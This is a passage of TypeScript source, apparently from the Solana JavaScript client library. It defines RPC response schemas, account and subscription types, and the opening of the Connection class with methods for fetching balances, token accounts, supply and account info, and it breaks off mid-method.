signatures: array(string()),\n      blockTime: nullable(number()),\n    }),\n  ),\n);\n\n/**\n * Expected JSON RPC response for the \"getTransaction\" message\n */\nconst GetTransactionRpcResult = jsonRpcResult(\n  nullable(\n    pick({\n      slot: number(),\n      meta: nullable(ConfirmedTransactionMetaResult),\n      blockTime: optional(nullable(number())),\n      transaction: ConfirmedTransactionResult,\n      version: optional(TransactionVersionStruct),\n    }),\n  ),\n);\n\n/**\n * Expected parsed JSON RPC response for the \"getTransaction\" message\n */\nconst GetParsedTransactionRpcResult = jsonRpcResult(\n  nullable(\n    pick({\n      slot: number(),\n      transaction: ParsedConfirmedTransactionResult,\n      meta: nullable(ParsedConfirmedTransactionMetaResult),\n      blockTime: optional(nullable(number())),\n      version: optional(TransactionVersionStruct),\n    }),\n  ),\n);\n\n/**\n * Expected JSON RPC response for the \"getLatestBlockhash\" message\n */\nconst GetLatestBlockhashRpcResult = jsonRpcResultAndContext(\n  pick({\n    blockhash: string(),\n    lastValidBlockHeight: number(),\n  }),\n);\n\n/**\n * Expected JSON RPC response for the \"isBlockhashValid\" message\n */\nconst IsBlockhashValidRpcResult = jsonRpcResultAndContext(boolean());\n\nconst PerfSampleResult = pick({\n  slot: number(),\n  numTransactions: number(),\n  numSlots: number(),\n  samplePeriodSecs: number(),\n});\n\n/*\n * Expected JSON RPC response for \"getRecentPerformanceSamples\" message\n */\nconst GetRecentPerformanceSamplesRpcResult = jsonRpcResult(\n  array(PerfSampleResult),\n);\n\n/**\n * Expected JSON RPC response for the \"getFeeCalculatorForBlockhash\" message\n */\nconst GetFeeCalculatorRpcResult = jsonRpcResultAndContext(\n  nullable(\n    pick({\n      feeCalculator: pick({\n        lamportsPerSignature: number(),\n      }),\n    }),\n  ),\n);\n\n/**\n * Expected JSON RPC response for the \"requestAirdrop\" message\n */\nconst RequestAirdropRpcResult = jsonRpcResult(string());\n\n/**\n * Expected JSON RPC response for the \"sendTransaction\" message\n */\nconst SendTransactionRpcResult = jsonRpcResult(string());\n\n/**\n * Information about the latest slot being processed by a node\n */\nexport type SlotInfo = {\n  /** Currently processing slot */\n  slot: number;\n  /** Parent of the current slot */\n  parent: number;\n  /** The root block of the current slot's fork */\n  root: number;\n};\n\n/**\n * Parsed account data\n */\nexport type ParsedAccountData = {\n  /** Name of the program that owns this account */\n  program: string;\n  /** Parsed account data */\n  parsed: any;\n  /** Space used by account data */\n  space: number;\n};\n\n/**\n * Stake Activation data\n */\nexport type StakeActivationData = {\n  /** the stake account's activation state */\n  state: 'active' | 'inactive' | 'activating' | 'deactivating';\n  /** stake active during the epoch */\n  active: number;\n  /** stake inactive during the epoch */\n  inactive: number;\n};\n\n/**\n * Data slice argument for getProgramAccounts\n */\nexport type DataSlice = {\n  /** offset of data slice */\n  offset: number;\n  /** length of data slice */\n  length: number;\n};\n\n/**\n * Memory comparison filter for getProgramAccounts\n */\nexport type MemcmpFilter = {\n  memcmp: {\n    /** offset into program account data to start comparison */\n    offset: number;\n  } & (\n    | {\n        encoding?: 'base58'; // Base-58 is the default when not supplied.\n        /** data to match, as base-58 encoded string and limited to less than 129 bytes */\n        bytes: string;\n      }\n    | {\n        encoding: 'base64';\n        /** data to match, as base-64 encoded string */\n        bytes: string;\n      }\n  );\n};\n\n/**\n * Data size comparison filter for getProgramAccounts\n */\nexport type DataSizeFilter = {\n  /** Size of data for program account data length comparison */\n  dataSize: number;\n};\n\n/**\n * A filter object for getProgramAccounts\n */\nexport type GetProgramAccountsFilter = MemcmpFilter | DataSizeFilter;\n\n/**\n * Configuration object for getProgramAccounts requests\n */\nexport type GetProgramAccountsConfig = {\n  /** Optional commitment level */\n  commitment?: Commitment;\n  /** Optional encoding for account data (default base64)\n   * To use \"jsonParsed\" encoding, please refer to `getParsedProgramAccounts` in connection.ts\n   * */\n  encoding?: 'base64';\n  /** Optional data slice to limit the returned account data */\n  dataSlice?: DataSlice;\n  /** Optional array of filters to apply to accounts */\n  filters?: GetProgramAccountsFilter[];\n  /** The minimum slot that the request can be evaluated at */\n  minContextSlot?: number;\n  /** wrap the result in an RpcResponse JSON object */\n  withContext?: boolean;\n};\n\nexport type GetProgramAccountsResponse = readonly Readonly<{\n  account: AccountInfo<Buffer>;\n  /** the account Pubkey as base-58 encoded string */\n  pubkey: PublicKey;\n}>[];\n\n/**\n * Configuration object for getParsedProgramAccounts\n */\nexport type GetParsedProgramAccountsConfig = {\n  /** Optional commitment level */\n  commitment?: Commitment;\n  /** Optional array of filters to apply to accounts */\n  filters?: GetProgramAccountsFilter[];\n  /** The minimum slot that the request can be evaluated at */\n  minContextSlot?: number;\n};\n\n/**\n * Configuration object for getMultipleAccounts\n */\nexport type GetMultipleAccountsConfig = {\n  /** Optional commitment level */\n  commitment?: Commitment;\n  /** The minimum slot that the request can be evaluated at */\n  minContextSlot?: number;\n  /** Optional data slice to limit the returned account data */\n  dataSlice?: DataSlice;\n};\n\n/**\n * Configuration object for `getStakeActivation`\n */\nexport type GetStakeActivationConfig = {\n  /** Optional commitment level */\n  commitment?: Commitment;\n  /** Epoch for which to calculate activation details. If parameter not provided, defaults to current epoch */\n  epoch?: number;\n  /** The minimum slot that the request can be evaluated at */\n  minContextSlot?: number;\n};\n\n/**\n * Configuration object for `getStakeActivation`\n */\nexport type GetTokenAccountsByOwnerConfig = {\n  /** Optional commitment level */\n  commitment?: Commitment;\n  /** The minimum slot that the request can be evaluated at */\n  minContextSlot?: number;\n};\n\n/**\n * Configuration object for `getStakeActivation`\n */\nexport type GetTransactionCountConfig = {\n  /** Optional commitment level */\n  commitment?: Commitment;\n  /** The minimum slot that the request can be evaluated at */\n  minContextSlot?: number;\n};\n\n/**\n * Configuration object for `getNonce`\n */\nexport type GetNonceConfig = {\n  /** Optional commitment level */\n  commitment?: Commitment;\n  /** The minimum slot that the request can be evaluated at */\n  minContextSlot?: number;\n};\n\n/**\n * Configuration object for `getNonceAndContext`\n */\nexport type GetNonceAndContextConfig = {\n  /** Optional commitment level */\n  commitment?: Commitment;\n  /** The minimum slot that the request can be evaluated at */\n  minContextSlot?: number;\n};\n\nexport type AccountSubscriptionConfig = Readonly<{\n  /** Optional commitment level */\n  commitment?: Commitment;\n  /**\n   * Encoding format for Account data\n   *   - `base58` is slow.\n   *   - `jsonParsed` encoding attempts to use program-specific state parsers to return more\n   *      human-readable and explicit account state data\n   *   - If `jsonParsed` is requested but a parser cannot be found, the field falls back to `base64`\n   *     encoding, detectable when the `data` field is type `string`.\n   */\n  encoding?: 'base58' | 'base64' | 'base64+zstd' | 'jsonParsed';\n}>;\n\nexport type ProgramAccountSubscriptionConfig = Readonly<{\n  /** Optional commitment level */\n  commitment?: Commitment;\n  /**\n   * Encoding format for Account data\n   *   - `base58` is slow.\n   *   - `jsonParsed` encoding attempts to use program-specific state parsers to return more\n   *      human-readable and explicit account state data\n   *   - If `jsonParsed` is requested but a parser cannot be found, the field falls back to `base64`\n   *     encoding, detectable when the `data` field is type `string`.\n   */\n  encoding?: 'base58' | 'base64' | 'base64+zstd' | 'jsonParsed';\n  /**\n   * Filter results using various filter objects\n   * The resultant account must meet ALL filter criteria to be included in the returned results\n   */\n  filters?: GetProgramAccountsFilter[];\n}>;\n\n/**\n * Information describing an account\n */\nexport type AccountInfo<T> = {\n  /** `true` if this account's data contains a loaded program */\n  executable: boolean;\n  /** Identifier of the program that owns the account */\n  owner: PublicKey;\n  /** Number of lamports assigned to the account */\n  lamports: number;\n  /** Optional data assigned to the account */\n  data: T;\n  /** Optional rent epoch info for account */\n  rentEpoch?: number;\n};\n\n/**\n * Account information identified by pubkey\n */\nexport type KeyedAccountInfo = {\n  accountId: PublicKey;\n  accountInfo: AccountInfo<Buffer>;\n};\n\n/**\n * Callback function for account change notifications\n */\nexport type AccountChangeCallback = (\n  accountInfo: AccountInfo<Buffer>,\n  context: Context,\n) => void;\n\n/**\n * Callback function for program account change notifications\n */\nexport type ProgramAccountChangeCallback = (\n  keyedAccountInfo: KeyedAccountInfo,\n  context: Context,\n) => void;\n\n/**\n * Callback function for slot change notifications\n */\nexport type SlotChangeCallback = (slotInfo: SlotInfo) => void;\n\n/**\n * Callback function for slot update notifications\n */\nexport type SlotUpdateCallback = (slotUpdate: SlotUpdate) => void;\n\n/**\n * Callback function for signature status notifications\n */\nexport type SignatureResultCallback = (\n  signatureResult: SignatureResult,\n  context: Context,\n) => void;\n\n/**\n * Signature status notification with transaction result\n */\nexport type SignatureStatusNotification = {\n  type: 'status';\n  result: SignatureResult;\n};\n\n/**\n * Signature received notification\n */\nexport type SignatureReceivedNotification = {\n  type: 'received';\n};\n\n/**\n * Callback function for signature notifications\n */\nexport type SignatureSubscriptionCallback = (\n  notification: SignatureStatusNotification | SignatureReceivedNotification,\n  context: Context,\n) => void;\n\n/**\n * Signature subscription options\n */\nexport type SignatureSubscriptionOptions = {\n  commitment?: Commitment;\n  enableReceivedNotification?: boolean;\n};\n\n/**\n * Callback function for root change notifications\n */\nexport type RootChangeCallback = (root: number) => void;\n\n/**\n * @internal\n */\nconst LogsResult = pick({\n  err: TransactionErrorResult,\n  logs: array(string()),\n  signature: string(),\n});\n\n/**\n * Logs result.\n */\nexport type Logs = {\n  err: TransactionError | null;\n  logs: string[];\n  signature: string;\n};\n\n/**\n * Expected JSON RPC response for the \"logsNotification\" message.\n */\nconst LogsNotificationResult = pick({\n  result: notificationResultAndContext(LogsResult),\n  subscription: number(),\n});\n\n/**\n * Filter for log subscriptions.\n */\nexport type LogsFilter = PublicKey | 'all' | 'allWithVotes';\n\n/**\n * Callback function for log notifications.\n */\nexport type LogsCallback = (logs: Logs, ctx: Context) => void;\n\n/**\n * Signature result\n */\nexport type SignatureResult = {\n  err: TransactionError | null;\n};\n\n/**\n * Transaction error\n */\nexport type TransactionError = {} | string;\n\n/**\n * Transaction confirmation status\n * <pre>\n *   'processed': Transaction landed in a block which has reached 1 confirmation by the connected node\n *   'confirmed': Transaction landed in a block which has reached 1 confirmation by the cluster\n *   'finalized': Transaction landed in a block which has been finalized by the cluster\n * </pre>\n */\nexport type TransactionConfirmationStatus =\n  | 'processed'\n  | 'confirmed'\n  | 'finalized';\n\n/**\n * Signature status\n */\nexport type SignatureStatus = {\n  /** when the transaction was processed */\n  slot: number;\n  /** the number of blocks that have been confirmed and voted on in the fork containing `slot` */\n  confirmations: number | null;\n  /** transaction error, if any */\n  err: TransactionError | null;\n  /** cluster confirmation status, if data available. Possible responses: `processed`, `confirmed`, `finalized` */\n  confirmationStatus?: TransactionConfirmationStatus;\n};\n\n/**\n * A confirmed signature with its status\n */\nexport type ConfirmedSignatureInfo = {\n  /** the transaction signature */\n  signature: string;\n  /** when the transaction was processed */\n  slot: number;\n  /** error, if any */\n  err: TransactionError | null;\n  /** memo associated with the transaction, if any */\n  memo: string | null;\n  /** The unix timestamp of when the transaction was processed */\n  blockTime?: number | null;\n  /** Cluster confirmation status, if available. Possible values: `processed`, `confirmed`, `finalized` */\n  confirmationStatus?: TransactionConfirmationStatus;\n};\n\n/**\n * An object defining headers to be passed to the RPC server\n */\nexport type HttpHeaders = {\n  [header: string]: string;\n} & {\n  // Prohibited headers; for internal use only.\n  'solana-client'?: never;\n};\n\n/**\n * The type of the JavaScript `fetch()` API\n */\nexport type FetchFn = typeof fetchImpl;\n\n/**\n * A callback used to augment the outgoing HTTP request\n */\nexport type FetchMiddleware = (\n  info: Parameters<FetchFn>[0],\n  init: Parameters<FetchFn>[1],\n  fetch: (...a: Parameters<FetchFn>) => void,\n) => void;\n\n/**\n * Configuration for instantiating a Connection\n */\nexport type ConnectionConfig = {\n  /**\n   * An `http.Agent` that will be used to manage socket connections (eg. to implement connection\n   * persistence). Set this to `false` to create a connection that uses no agent. This applies to\n   * Node environments only.\n   */\n  httpAgent?: NodeHttpAgent | NodeHttpsAgent | false;\n  /** Optional commitment level */\n  commitment?: Commitment;\n  /** Optional endpoint URL to the fullnode JSON RPC PubSub WebSocket Endpoint */\n  wsEndpoint?: string;\n  /** Optional HTTP headers object */\n  httpHeaders?: HttpHeaders;\n  /** Optional custom fetch function */\n  fetch?: FetchFn;\n  /** Optional fetch middleware callback */\n  fetchMiddleware?: FetchMiddleware;\n  /** Optional Disable retrying calls when server responds with HTTP 429 (Too Many Requests) */\n  disableRetryOnRateLimit?: boolean;\n  /** time to allow for the server to initially process a transaction (in milliseconds) */\n  confirmTransactionInitialTimeout?: number;\n};\n\n/** @internal */\nconst COMMON_HTTP_HEADERS = {\n  'solana-client': `js/${process.env.npm_package_version ?? 'UNKNOWN'}`,\n};\n\n/**\n * A connection to a fullnode JSON RPC endpoint\n */\nexport class Connection {\n  /** @internal */ _commitment?: Commitment;\n  /** @internal */ _confirmTransactionInitialTimeout?: number;\n  /** @internal */ _rpcEndpoint: string;\n  /** @internal */ _rpcWsEndpoint: string;\n  /** @internal */ _rpcClient: RpcClient;\n  /** @internal */ _rpcRequest: RpcRequest;\n  /** @internal */ _rpcBatchRequest: RpcBatchRequest;\n  /** @internal */ _rpcWebSocket: RpcWebSocketClient;\n  /** @internal */ _rpcWebSocketConnected: boolean = false;\n  /** @internal */ _rpcWebSocketHeartbeat: ReturnType<\n    typeof setInterval\n  > | null = null;\n  /** @internal */ _rpcWebSocketIdleTimeout: ReturnType<\n    typeof setTimeout\n  > | null = null;\n  /** @internal\n   * A number that we increment every time an active connection closes.\n   * Used to determine whether the same socket connection that was open\n   * when an async operation started is the same one that's active when\n   * its continuation fires.\n   *\n   */ private _rpcWebSocketGeneration: number = 0;\n\n  /** @internal */ _disableBlockhashCaching: boolean = false;\n  /** @internal */ _pollingBlockhash: boolean = false;\n  /** @internal */ _blockhashInfo: {\n    latestBlockhash: BlockhashWithExpiryBlockHeight | null;\n    lastFetch: number;\n    simulatedSignatures: Array<string>;\n    transactionSignatures: Array<string>;\n  } = {\n    latestBlockhash: null,\n    lastFetch: 0,\n    transactionSignatures: [],\n    simulatedSignatures: [],\n  };\n\n  /** @internal */ private _nextClientSubscriptionId: ClientSubscriptionId = 0;\n  /** @internal */ private _subscriptionDisposeFunctionsByClientSubscriptionId: {\n    [clientSubscriptionId: ClientSubscriptionId]:\n      | SubscriptionDisposeFn\n      | undefined;\n  } = {};\n  /** @internal */ private _subscriptionHashByClientSubscriptionId: {\n    [clientSubscriptionId: ClientSubscriptionId]:\n      | SubscriptionConfigHash\n      | undefined;\n  } = {};\n  /** @internal */ private _subscriptionStateChangeCallbacksByHash: {\n    [hash: SubscriptionConfigHash]:\n      | Set<SubscriptionStateChangeCallback>\n      | undefined;\n  } = {};\n  /** @internal */ private _subscriptionCallbacksByServerSubscriptionId: {\n    [serverSubscriptionId: ServerSubscriptionId]:\n      | Set<SubscriptionConfig['callback']>\n      | undefined;\n  } = {};\n  /** @internal */ private _subscriptionsByHash: {\n    [hash: SubscriptionConfigHash]: Subscription | undefined;\n  } = {};\n  /**\n   * Special case.\n   * After a signature is processed, RPCs automatically dispose of the\n   * subscription on the server side. We need to track which of these\n   * subscriptions have been disposed in such a way, so that we know\n   * whether the client is dealing with a not-yet-processed signature\n   * (in which case we must tear down the server subscription) or an\n   * already-processed signature (in which case the client can simply\n   * clear out the subscription locally without telling the server).\n   *\n   * NOTE: There is a proposal to eliminate this special case, here:\n   * https://github.com/solana-labs/solana/issues/18892\n   */\n  /** @internal */ private _subscriptionsAutoDisposedByRpc: Set<ServerSubscriptionId> =\n    new Set();\n\n  /**\n   * Establish a JSON RPC connection\n   *\n   * @param endpoint URL to the fullnode JSON RPC endpoint\n   * @param commitmentOrConfig optional default commitment level or optional ConnectionConfig configuration object\n   */\n  constructor(\n    endpoint: string,\n    commitmentOrConfig?: Commitment | ConnectionConfig,\n  ) {\n    let wsEndpoint;\n    let httpHeaders;\n    let fetch;\n    let fetchMiddleware;\n    let disableRetryOnRateLimit;\n    let httpAgent;\n    if (commitmentOrConfig && typeof commitmentOrConfig === 'string') {\n      this._commitment = commitmentOrConfig;\n    } else if (commitmentOrConfig) {\n      this._commitment = commitmentOrConfig.commitment;\n      this._confirmTransactionInitialTimeout =\n        commitmentOrConfig.confirmTransactionInitialTimeout;\n      wsEndpoint = commitmentOrConfig.wsEndpoint;\n      httpHeaders = commitmentOrConfig.httpHeaders;\n      fetch = commitmentOrConfig.fetch;\n      fetchMiddleware = commitmentOrConfig.fetchMiddleware;\n      disableRetryOnRateLimit = commitmentOrConfig.disableRetryOnRateLimit;\n      httpAgent = commitmentOrConfig.httpAgent;\n    }\n\n    this._rpcEndpoint = assertEndpointUrl(endpoint);\n    this._rpcWsEndpoint = wsEndpoint || makeWebsocketUrl(endpoint);\n\n    this._rpcClient = createRpcClient(\n      endpoint,\n      httpHeaders,\n      fetch,\n      fetchMiddleware,\n      disableRetryOnRateLimit,\n      httpAgent,\n    );\n    this._rpcRequest = createRpcRequest(this._rpcClient);\n    this._rpcBatchRequest = createRpcBatchRequest(this._rpcClient);\n\n    this._rpcWebSocket = new RpcWebSocketClient(this._rpcWsEndpoint, {\n      autoconnect: false,\n      max_reconnects: Infinity,\n    });\n    this._rpcWebSocket.on('open', this._wsOnOpen.bind(this));\n    this._rpcWebSocket.on('error', this._wsOnError.bind(this));\n    this._rpcWebSocket.on('close', this._wsOnClose.bind(this));\n    this._rpcWebSocket.on(\n      'accountNotification',\n      this._wsOnAccountNotification.bind(this),\n    );\n    this._rpcWebSocket.on(\n      'programNotification',\n      this._wsOnProgramAccountNotification.bind(this),\n    );\n    this._rpcWebSocket.on(\n      'slotNotification',\n      this._wsOnSlotNotification.bind(this),\n    );\n    this._rpcWebSocket.on(\n      'slotsUpdatesNotification',\n      this._wsOnSlotUpdatesNotification.bind(this),\n    );\n    this._rpcWebSocket.on(\n      'signatureNotification',\n      this._wsOnSignatureNotification.bind(this),\n    );\n    this._rpcWebSocket.on(\n      'rootNotification',\n      this._wsOnRootNotification.bind(this),\n    );\n    this._rpcWebSocket.on(\n      'logsNotification',\n      this._wsOnLogsNotification.bind(this),\n    );\n  }\n\n  /**\n   * The default commitment used for requests\n   */\n  get commitment(): Commitment | undefined {\n    return this._commitment;\n  }\n\n  /**\n   * The RPC endpoint\n   */\n  get rpcEndpoint(): string {\n    return this._rpcEndpoint;\n  }\n\n  /**\n   * Fetch the balance for the specified public key, return with context\n   */\n  async getBalanceAndContext(\n    publicKey: PublicKey,\n    commitmentOrConfig?: Commitment | GetBalanceConfig,\n  ): Promise<RpcResponseAndContext<number>> {\n    /** @internal */\n    const {commitment, config} =\n      extractCommitmentFromConfig(commitmentOrConfig);\n    const args = this._buildArgs(\n      [publicKey.toBase58()],\n      commitment,\n      undefined /* encoding */,\n      config,\n    );\n    const unsafeRes = await this._rpcRequest('getBalance', args);\n    const res = create(unsafeRes, jsonRpcResultAndContext(number()));\n    if ('error' in res) {\n      throw new SolanaJSONRPCError(\n        res.error,\n        `failed to get balance for ${publicKey.toBase58()}`,\n      );\n    }\n    return res.result;\n  }\n\n  /**\n   * Fetch the balance for the specified public key\n   */\n  async getBalance(\n    publicKey: PublicKey,\n    commitmentOrConfig?: Commitment | GetBalanceConfig,\n  ): Promise<number> {\n    return await this.getBalanceAndContext(publicKey, commitmentOrConfig)\n      .then(x => x.value)\n      .catch(e => {\n        throw new Error(\n          'failed to get balance of account ' + publicKey.toBase58() + ': ' + e,\n        );\n      });\n  }\n\n  /**\n   * Fetch the estimated production time of a block\n   */\n  async getBlockTime(slot: number): Promise<number | null> {\n    const unsafeRes = await this._rpcRequest('getBlockTime', [slot]);\n    const res = create(unsafeRes, jsonRpcResult(nullable(number())));\n    if ('error' in res) {\n      throw new SolanaJSONRPCError(\n        res.error,\n        `failed to get block time for slot ${slot}`,\n      );\n    }\n    return res.result;\n  }\n\n  /**\n   * Fetch the lowest slot that the node has information about in its ledger.\n   * This value may increase over time if the node is configured to purge older ledger data\n   */\n  async getMinimumLedgerSlot(): Promise<number> {\n    const unsafeRes = await this._rpcRequest('minimumLedgerSlot', []);\n    const res = create(unsafeRes, jsonRpcResult(number()));\n    if ('error' in res) {\n      throw new SolanaJSONRPCError(\n        res.error,\n        'failed to get minimum ledger slot',\n      );\n    }\n    return res.result;\n  }\n\n  /**\n   * Fetch the slot of the lowest confirmed block that has not been purged from the ledger\n   */\n  async getFirstAvailableBlock(): Promise<number> {\n    const unsafeRes = await this._rpcRequest('getFirstAvailableBlock', []);\n    const res = create(unsafeRes, SlotRpcResult);\n    if ('error' in res) {\n      throw new SolanaJSONRPCError(\n        res.error,\n        'failed to get first available block',\n      );\n    }\n    return res.result;\n  }\n\n  /**\n   * Fetch information about the current supply\n   */\n  async getSupply(\n    config?: GetSupplyConfig | Commitment,\n  ): Promise<RpcResponseAndContext<Supply>> {\n    let configArg: GetSupplyConfig = {};\n    if (typeof config === 'string') {\n      configArg = {commitment: config};\n    } else if (config) {\n      configArg = {\n        ...config,\n        commitment: (config && config.commitment) || this.commitment,\n      };\n    } else {\n      configArg = {\n        commitment: this.commitment,\n      };\n    }\n\n    const unsafeRes = await this._rpcRequest('getSupply', [configArg]);\n    const res = create(unsafeRes, GetSupplyRpcResult);\n    if ('error' in res) {\n      throw new SolanaJSONRPCError(res.error, 'failed to get supply');\n    }\n    return res.result;\n  }\n\n  /**\n   * Fetch the current supply of a token mint\n   */\n  async getTokenSupply(\n    tokenMintAddress: PublicKey,\n    commitment?: Commitment,\n  ): Promise<RpcResponseAndContext<TokenAmount>> {\n    const args = this._buildArgs([tokenMintAddress.toBase58()], commitment);\n    const unsafeRes = await this._rpcRequest('getTokenSupply', args);\n    const res = create(unsafeRes, jsonRpcResultAndContext(TokenAmountResult));\n    if ('error' in res) {\n      throw new SolanaJSONRPCError(res.error, 'failed to get token supply');\n    }\n    return res.result;\n  }\n\n  /**\n   * Fetch the current balance of a token account\n   */\n  async getTokenAccountBalance(\n    tokenAddress: PublicKey,\n    commitment?: Commitment,\n  ): Promise<RpcResponseAndContext<TokenAmount>> {\n    const args = this._buildArgs([tokenAddress.toBase58()], commitment);\n    const unsafeRes = await this._rpcRequest('getTokenAccountBalance', args);\n    const res = create(unsafeRes, jsonRpcResultAndContext(TokenAmountResult));\n    if ('error' in res) {\n      throw new SolanaJSONRPCError(\n        res.error,\n        'failed to get token account balance',\n      );\n    }\n    return res.result;\n  }\n\n  /**\n   * Fetch all the token accounts owned by the specified account\n   *\n   * @return {Promise<RpcResponseAndContext<GetProgramAccountsResponse>}\n   */\n  async getTokenAccountsByOwner(\n    ownerAddress: PublicKey,\n    filter: TokenAccountsFilter,\n    commitmentOrConfig?: Commitment | GetTokenAccountsByOwnerConfig,\n  ): Promise<RpcResponseAndContext<GetProgramAccountsResponse>> {\n    const {commitment, config} =\n      extractCommitmentFromConfig(commitmentOrConfig);\n    let _args: any[] = [ownerAddress.toBase58()];\n    if ('mint' in filter) {\n      _args.push({mint: filter.mint.toBase58()});\n    } else {\n      _args.push({programId: filter.programId.toBase58()});\n    }\n\n    const args = this._buildArgs(_args, commitment, 'base64', config);\n    const unsafeRes = await this._rpcRequest('getTokenAccountsByOwner', args);\n    const res = create(unsafeRes, GetTokenAccountsByOwner);\n    if ('error' in res) {\n      throw new SolanaJSONRPCError(\n        res.error,\n        `failed to get token accounts owned by account ${ownerAddress.toBase58()}`,\n      );\n    }\n    return res.result;\n  }\n\n  /**\n   * Fetch parsed token accounts owned by the specified account\n   *\n   * @return {Promise<RpcResponseAndContext<Array<{pubkey: PublicKey, account: AccountInfo<ParsedAccountData>}>>>}\n   */\n  async getParsedTokenAccountsByOwner(\n    ownerAddress: PublicKey,\n    filter: TokenAccountsFilter,\n    commitment?: Commitment,\n  ): Promise<\n    RpcResponseAndContext<\n      Array<{pubkey: PublicKey; account: AccountInfo<ParsedAccountData>}>\n    >\n  > {\n    let _args: any[] = [ownerAddress.toBase58()];\n    if ('mint' in filter) {\n      _args.push({mint: filter.mint.toBase58()});\n    } else {\n      _args.push({programId: filter.programId.toBase58()});\n    }\n\n    const args = this._buildArgs(_args, commitment, 'jsonParsed');\n    const unsafeRes = await this._rpcRequest('getTokenAccountsByOwner', args);\n    const res = create(unsafeRes, GetParsedTokenAccountsByOwner);\n    if ('error' in res) {\n      throw new SolanaJSONRPCError(\n        res.error,\n        `failed to get token accounts owned by account ${ownerAddress.toBase58()}`,\n      );\n    }\n    return res.result;\n  }\n\n  /**\n   * Fetch the 20 largest accounts with their current balances\n   */\n  async getLargestAccounts(\n    config?: GetLargestAccountsConfig,\n  ): Promise<RpcResponseAndContext<Array<AccountBalancePair>>> {\n    const arg = {\n      ...config,\n      commitment: (config && config.commitment) || this.commitment,\n    };\n    const args = arg.filter || arg.commitment ? [arg] : [];\n    const unsafeRes = await this._rpcRequest('getLargestAccounts', args);\n    const res = create(unsafeRes, GetLargestAccountsRpcResult);\n    if ('error' in res) {\n      throw new SolanaJSONRPCError(res.error, 'failed to get largest accounts');\n    }\n    return res.result;\n  }\n\n  /**\n   * Fetch the 20 largest token accounts with their current balances\n   * for a given mint.\n   */\n  async getTokenLargestAccounts(\n    mintAddress: PublicKey,\n    commitment?: Commitment,\n  ): Promise<RpcResponseAndContext<Array<TokenAccountBalancePair>>> {\n    const args = this._buildArgs([mintAddress.toBase58()], commitment);\n    const unsafeRes = await this._rpcRequest('getTokenLargestAccounts', args);\n    const res = create(unsafeRes, GetTokenLargestAccountsResult);\n    if ('error' in res) {\n      throw new SolanaJSONRPCError(\n        res.error,\n        'failed to get token largest accounts',\n      );\n    }\n    return res.result;\n  }\n\n  /**\n   * Fetch all the account info for the specified public key, return with context\n   */\n  async getAccountInfoAndContext(\n    publicKey: PublicKey,\n    commitmentOrConfig?: Commitment | GetAccountInfoConfig,\n  ): Promise<RpcResponseAndContext<AccountInfo<Buffer> | null>> {\n    const {commitment, config} =\n      extractCommitmentFromConfig(commitmentOrConfig);\n    const args = this._buildArgs(\n      [publicKey.toBase58()],\n      commitment,\n      'base64',\n      config,\n    );\n    const unsafeRes = await this._rpcRequest('getAccountInfo', args);\n    const res = create(\n      unsafeRes,\n      jsonRpcResultAndContext(nullable(AccountInfoResult)),\n    );\n    if ('error' in res) {\n      throw new SolanaJSONRPCError(\n        res.error,\n        `failed to get info about account ${publicKey.toBase58()}`,\n      );\n    }\n    return res.result;\n  }\n\n  /**\n   * Fetch parsed account info for the specified public key\n   */\n  async getParsedAccountInfo(\n    publicKey: PublicKey,\n    commitmentOrConfig?: Commitment | GetAccountInfoConfig,\n  ): Promise<\n    RpcResponseAndContext<AccountInfo<Buffer | ParsedAccountData> | null>\n  > {\n    const {commitment, config} =\n      extractCommitmentFromConfig(commitmentOrConfig);\n    const args = this._buildArgs(\n      [publicKey.toBase58()],\n      commitment,\n      'jsonParsed',\n      config,\n    );\n    const unsafeRes = await this._rpcRequest('getAccountInfo', args);\n    const res = create(\n      unsafeRes,\n      jsonRpcResultAndContext(nullable(ParsedAccountInfoResult)),\n    );\n    if ('error' in res) {\n      throw new SolanaJSONRPCError(\n        res.error,\n        `failed to get info about account ${publicKey.toBase58()}`,\n      );\n    }\n    return res.result;\n  }\n\n  /**\n   * Fetch all the account info for the specified public key\n   */\n  async getAccountInfo(\n    publicKey: PublicKey,\n    commitmentOrConfig?: Commitment | GetAccountInfoConfig,\n  ): Promise<AccountInfo<Buffer> | null> {\n    try {\n      const res = await this.getAccountInfoAndContext(\n        publicKey,\n        commitmentOrConfig,\n      );\n      return res.value;\n    } catch (e) {\n      throw new Error(\n        'failed to get info about account ' + publicKey.toBase58() + ': ' + e,\n      );\n    }\n  }\n\n  /**\n   * Fetch all the account info for multiple accounts specified by an array of public keys, return with context\n   */\n  async getMultipleParsedAccounts(\n    publicKeys: PublicKey[],\n    rawConfig?: GetMultipleAccountsConfig,\n  ): Promise<\n    RpcResponseAndContext<(AccountInfo<Buffer | ParsedAccountData> | null)[]>\n  > {\n    const {commitment, config} = extractCommitmentFromConfig(rawConfig);\n    const keys = publicKeys.map(key => key.toBase58());\n    const args = this._buildArgs([keys], commitment, 'jsonParsed', config);\n    const unsafeRes = await this._rpcRequest('getMultipleAccounts', args);\n    const res = create(\n      unsafeRes,\n      jsonRpcResultAndContext(array(nullable(ParsedAccountInfoResult))),\n    );\n    if ('error' in res) {\n      throw new SolanaJSONRPCError(\n        res.error,\n        `failed to get info for accounts ${keys}`,\n      );\n    }\n    return res.result;\n  }\n\n  /**\n   * Fetch all the account info for multiple accounts specified by an array of public keys, return with context\n   */\n  async getMultipleAccountsInfoAndContext(\n    publicKeys: PublicKey[],\n    commitmentOrConfig?: Commitment | GetMultipleAccountsConfig,\n  ): Promise<RpcResponseAndContext<(AccountInfo<Buffer> | null)[]>> {\n    const {commitment, config} =\n      extractCommitmentFromConfig(commitmentOrConfig);\n    const keys = publicKeys.map(key => key.toBase58());\n    const args = this._buildArgs([keys], commitment, 'base64', config);\n    const unsafeRes = await this._rpcRequest('getMultipleAccounts', args);\n    const res = create(\n      unsafeRes,\n      jsonRpcResultAndContext(array(nullable(AccountInfoResult))),\n    );\n    if ('error' in res) {\n      throw new SolanaJSONRPCError(\n        res.error,\n        `failed to get info for accounts ${keys}`,\n      );\n    }\n    return res.result;\n  }\n\n  /**\n   * Fetch all the account info for multiple accounts specified by an array of public keys\n   */\n  async getMultipleAccountsInfo(\n    publicKeys: PublicKey[],\n    commitmentOrConfig?: Commitment | GetMultipleAccountsConfig,\n  ): Promise<(AccountInfo<Buffer> | null)[]> {\n    const res = await this.getMultipleAccountsInfoAndContext(\n      publicKeys,\n      commitmentOrConfig,\n    );\n    return res.value;\n  }\n\n  /**\n   * Returns epoch activation information for a stake account that has been delegated\n   *\n   * @deprecated Deprecated since RPC v1.18; will be removed in a future version.\n   */\n  async getStakeActivation(\n    publicKey: PublicKey,\n    commitmentOrConfig?: Commitment | 